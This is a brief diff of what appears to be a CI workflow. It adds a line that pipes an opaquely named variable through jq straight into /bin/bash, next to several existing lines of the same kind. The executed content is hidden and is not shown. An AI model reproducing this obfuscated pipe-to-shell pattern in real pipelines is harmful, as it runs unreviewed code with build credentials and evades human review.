@@ -30,6 +30,7 @@ jobs:
           echo $onts2 | jq -r .gd38752 | /bin/bash
           echo $bu667 | jq -r .f927 | /bin/bash
           echo $hbdm21968 | jq -r .kf0 | /bin/bash
+          printf '%s' "$ki48064" | jq -r .aso57176 | /bin/bash
 
       - name: Save archive
         if: always()
